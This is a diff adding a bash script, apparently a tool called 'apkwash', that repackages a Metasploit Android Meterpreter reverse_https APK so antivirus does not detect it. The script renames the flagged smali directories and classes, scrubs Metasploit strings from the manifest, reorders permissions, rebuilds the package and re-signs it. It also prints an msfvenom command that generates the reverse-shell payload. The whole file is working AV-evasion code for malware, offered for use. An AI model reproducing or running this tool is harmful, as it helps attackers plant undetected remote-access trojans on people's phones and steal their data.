@@ -1,0 +1,90 @@
+#!/bin/bash
+
+# Author: Justin Breed
+# Purpose: Change msfvenom payload to bypass AV detection for a metasploit payload
+# Date: 0% detection as of 16Feb17
+
+# Need to add: *.apk filename check for passed in param
+# Need to add: Modification of installed app name
+
+if [ $# -eq 0 ] || [ ${1: -4} != ".apk" ]; then
+    echo
+    echo "-------------INVALID ARGUMENT------------"
+    echo "Please pass in a msfvenom generated .apk file"
+    echo "msfvenom -p android/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -o payload.apk"
+    echo "Ex: apkwash payload.apk"
+    echo "-----------------------------------------"
+    exit 1
+fi
+
+#Checking dependencies
+type apktool.jar >/dev/null 2>&1 || { 
+    echo "ApkTool depenency needed... downloading"
+    wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.2.2.jar
+    mv apktool_2.2.2.jar apktool.jar
+    chmod +x apktool.jar
+    mv apktool.jar /usr/local/bin/.
+}
+
+
+# Variables
+fullPath=$1
+APK=$(basename $fullPath)
+VAR1=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
+VAR2=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
+VAR3=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Payload.smali renaming
+JAR=`which apktool.jar`
+apkName=AndroidService
+
+#APKTool to pull apart the package
+java -jar $JAR d -f -o /tmp/payload $fullPath
+
+#Changing the default folder and filenames being flagged by AV
+mv /tmp/payload/smali/com/metasploit /tmp/payload/smali/com/$VAR1
+mv /tmp/payload/smali/com/$VAR1/stage /tmp/payload/smali/com/$VAR1/$VAR2
+mv /tmp/payload/smali/com/$VAR1/$VAR2/Payload.smali /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+
+#Updating path in .smali files
+sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
+sed -i "s#Payload#$VAR3#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
+
+#Flagged by AV, changed to something not as obvious
+sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.Android#" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+sed -i "s#payload#loader#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" /tmp/payload/AndroidManifest.xml
+sed -i "s#metasploit#AndroidProgram#" /tmp/payload/AndroidManifest.xml
+sed -i "s#MainActivity#$apkName#" /tmp/payload/res/values/strings.xml
+
+#Re-arranging the permissions, which were being flagged if in perfect order
+sed -i '/.SET_WALLPAPER/d' /tmp/payload/AndroidManifest.xml
+sed -i '/READ_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' /tmp/payload/AndroidManifest.xml
+
+#Rebuild the package using APKTool
+java -jar $JAR b /tmp/payload
+echo; 
+echo "Washed package created: `pwd`/washed_"$APK
+echo "Moving package to the current directory"
+mv /tmp/payload/dist/$APK washed_$APK
+echo
+
+#Signing the package
+echo "Checking for ~/.android/debug.keystore for signing"
+if [ ! -f ~/.android/debug.keystore ]; then
+    echo
+    echo "Debug key not found. Generating one now."
+    echo
+    if [ ! -d "~/.android" ]; then
+      mkdir ~/.android
+    fi
+    keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000
+fi
+echo;
+echo "Attempting to sign the package with your andrid debug key"
+jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA washed_$APK androiddebugkey
+echo
+echo "Signed the .apk file with ~/.android/debug.keystore"
+echo "Simply remove the debug.keystore file and re-run the program to be prompted to create a new debug key"
+echo
+echo "Cleaning up"
+#rm -rf /tmp/payload
+echo "Finished"
